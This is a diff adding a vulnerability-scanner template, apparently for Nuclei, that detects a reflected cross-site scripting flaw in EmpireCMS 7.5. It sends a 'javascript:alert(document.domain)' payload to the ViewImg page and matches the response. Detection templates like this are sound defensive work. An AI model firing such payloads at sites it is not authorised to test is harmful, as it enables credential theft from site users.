@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - type: word
+    words:
+    - onmousewheel=\"return bbimg(this)\"
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(document.domain)'
+id: empirecms-xss
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  description: EmpireCMS 7.5 contains a cross-site scripting vulnerability. An attacker
+    can execute arbitrary script and thus steal cookie-based authentication credentials
+    and launch other attacks.
+  metadata:
+    max-request: 1
+  name: EmpireCMS 7.5 - Cross-Site Scripting
+  reference:
+  - https://www.geek-share.com/detail/2777280260.html
+  - https://github.com/leadscloud/EmpireCMS/issues/4
+  severity: high
+  tags: empirecms,xss
